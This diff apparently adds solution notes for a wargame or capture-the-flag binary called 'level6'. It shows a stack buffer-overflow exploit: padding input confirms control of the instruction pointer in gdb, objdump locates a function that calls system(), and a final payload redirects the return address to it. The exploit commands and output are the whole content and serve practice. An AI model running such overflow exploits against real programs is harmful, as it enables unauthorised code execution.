@@ -1,0 +1,22 @@
+
+python -c "print('a' * 72 + 'AABB')" > /tmp/sol6
+
+gdb -ex run -ex q --args ./level6 $(cat /tmp/sol6)
+    ->  Program received signal SIGSEGV, Segmentation fault.
+        0x42424141 in ?? ()
+
+objdump -d -Mintel level6
+    ->  08048454 <n>:
+        8048454:       55                      push   ebp
+        8048455:       89 e5                   mov    ebp,esp
+        8048457:       83 ec 18                sub    esp,0x18
+        804845a:       c7 04 24 b0 85 04 08    mov    DWORD PTR [esp],0x80485b0
+        8048461:       e8 0a ff ff ff          call   8048370 <system@plt>
+        8048466:       c9                      leave
+        8048467:       c3                      ret
+
+
+
+python -c "print('a' * 72 + '\x54\x84\x04\x08')" > /tmp/sol6
+
+./level6 $(cat /tmp/sol6)
